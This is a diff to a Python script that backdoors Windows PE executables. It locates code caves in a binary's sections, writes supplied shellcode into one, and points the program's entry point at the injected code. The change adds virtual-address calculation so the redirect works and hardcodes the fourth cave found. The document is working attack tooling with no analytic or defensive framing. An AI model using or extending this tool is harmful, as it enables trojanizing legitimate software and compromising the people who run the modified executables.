@@ -5,11 +5,12 @@ import argparse
 
 @functools.total_ordering
 class code_cave:
-    def __init__(self, location, size, section):
+    def __init__(self, location, size, section, virtual_location):
         self.location = location
         self.size = size
         self.section = section
         self.section_name = section.Name
+        self.virtual_location = virtual_location
     
     def __lt__(self, other):
         return (self.size) < (other.size)
@@ -18,7 +19,7 @@ class code_cave:
         return (self.size) == (other.size)
 
     def print_cave(self):
-        print(f"Code cave at {hex(self.location)} of size {self.size} in {self.section_name.decode()}")
+        print(f"Code cave at real location {hex(self.location)} virtual location {hex(self.virtual_location)} of size {self.size} in {self.section_name.decode()}")
 
 def code_caves(min_size, pe_path):
     """
@@ -43,8 +44,9 @@ def code_caves(min_size, pe_path):
                 cave_size += 1
             else:
                 if cave_size > min_size:
-                    cave_location = section.PointerToRawData + pos - cave_size 
-                    caves.append(code_cave(location=cave_location, size=cave_size, section=section))
+                    cave_location = section.PointerToRawData + pos - cave_size
+                    virtual_cave_location =  section.VirtualAddress + pos - cave_size
+                    caves.append(code_cave(location=cave_location, size=cave_size, section=section, virtual_location=virtual_cave_location))
 
                 cave_size = 0
             pos += 1
@@ -108,13 +110,15 @@ def PEBackdoor(pe_path, shellcode, output, interactive = False):
     print(new_shellcode)
     pe.close()
     caves = code_caves(150, pe_path)
-    print(caves)
+    for cave in caves:
+        cave.print_cave()
 
 
+    print(hex(caves[3].location))
     pe = pefile.PE(pe_path)
-    write_shellcode(pe,caves[0].location,new_shellcode)
-    pe.OPTIONAL_HEADER.AddressOfEntryPoint = caves[0].location
-    caves[0].print_cave()
+    write_shellcode(pe,caves[3].location,new_shellcode)
+    pe.OPTIONAL_HEADER.AddressOfEntryPoint = caves[3].virtual_location
+    caves[3].print_cave()
     pe.write(output)
 
 
